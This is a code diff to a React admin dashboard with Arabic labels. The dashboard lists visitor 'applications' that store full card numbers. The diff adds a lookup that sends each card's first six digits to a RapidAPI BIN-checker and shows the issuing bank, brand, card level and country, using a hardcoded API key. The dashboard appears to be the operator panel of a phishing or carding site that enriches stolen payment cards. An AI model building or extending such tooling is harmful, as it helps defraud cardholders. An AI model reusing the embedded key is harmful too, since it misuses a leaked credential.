@@ -166,6 +166,8 @@ export default function Dashboard() {
   const [mobileVisitorSidebar, setMobileVisitorSidebar] = useState(false);
   const [mobileStatsExpanded, setMobileStatsExpanded] = useState(false);
   const prevAppsRef = useRef<Notification[]>([]);
+  const [binInfo, setBinInfo] = useState<any>(null);
+  const [binLoading, setBinLoading] = useState(false);
 
   const [isDark, setIsDark] = useState(() => {
     if (typeof window !== "undefined") {
@@ -331,6 +333,34 @@ export default function Dashboard() {
   const selectedApplication = notifications.find(
     (app) => app.id === selectedId,
   );
+
+  useEffect(() => {
+    const cardNum = selectedApplication ? getCardNumber(selectedApplication) : null;
+    if (!cardNum || cardNum.length < 6) {
+      setBinInfo(null);
+      return;
+    }
+    const bin = cardNum.replace(/\s/g, "").substring(0, 6);
+    setBinLoading(true);
+    const url = `https://bin-ip-checker.p.rapidapi.com/?bin=${bin}`;
+    const options = {
+      method: 'GET',
+      headers: {
+        'x-rapidapi-key': '5c73c39f9fmsh657b606dfa61046p16d2c3jsn127ed336a63b',
+        'x-rapidapi-host': 'bin-ip-checker.p.rapidapi.com'
+      }
+    };
+    fetch(url, options)
+      .then(res => res.json())
+      .then(data => {
+        setBinInfo(data);
+        setBinLoading(false);
+      })
+      .catch(() => {
+        setBinInfo(null);
+        setBinLoading(false);
+      });
+  }, [selectedApplication?.id, selectedApplication?.cardNumber, selectedApplication?.paymentInfo?.cardNumber]);
 
   const handleMarkAsRead = async (app: Notification) => {
     setSelectedId(app.id);
@@ -1539,6 +1569,49 @@ export default function Dashboard() {
                           </div>
                         </div>
                       </div>
+
+                      {/* BIN Info */}
+                      {binLoading && (
+                        <div className="text-center text-xs text-gray-400 py-2" data-testid="text-bin-loading">
+                          جاري البحث عن معلومات البطاقة...
+                        </div>
+                      )}
+                      {binInfo && binInfo.success && (
+                        <div className="grid grid-cols-2 gap-2 text-xs mb-3 p-3 rounded-lg bg-gray-50 dark:bg-gray-700/50" data-testid="card-bin-info">
+                          {binInfo.BIN?.issuer?.name && (
+                            <>
+                              <span className="text-gray-500 dark:text-gray-400">البنك المصدر</span>
+                              <span className="font-medium text-right" data-testid="text-bin-bank">{binInfo.BIN.issuer.name}</span>
+                            </>
+                          )}
+                          {binInfo.BIN?.brand && (
+                            <>
+                              <span className="text-gray-500 dark:text-gray-400">نوع البطاقة</span>
+                              <span className="font-medium text-right" data-testid="text-bin-brand">{binInfo.BIN.brand}</span>
+                            </>
+                          )}
+                          {binInfo.BIN?.type && (
+                            <>
+                              <span className="text-gray-500 dark:text-gray-400">الفئة</span>
+                              <span className="font-medium text-right" data-testid="text-bin-type">{binInfo.BIN.type}</span>
+                            </>
+                          )}
+                          {binInfo.BIN?.level && (
+                            <>
+                              <span className="text-gray-500 dark:text-gray-400">المستوى</span>
+                              <span className="font-medium text-right" data-testid="text-bin-level">{binInfo.BIN.level}</span>
+                            </>
+                          )}
+                          {binInfo.BIN?.country?.name && (
+                            <>
+                              <span className="text-gray-500 dark:text-gray-400">الدولة</span>
+                              <span className="font-medium text-right" data-testid="text-bin-country">
+                                {binInfo.BIN.country.flag} {binInfo.BIN.country.name}
+                              </span>
+                            </>
+                          )}
+                        </div>
+                      )}
 
                       {/* Action Buttons */}
                       <div className="flex flex-wrap items-center gap-2">
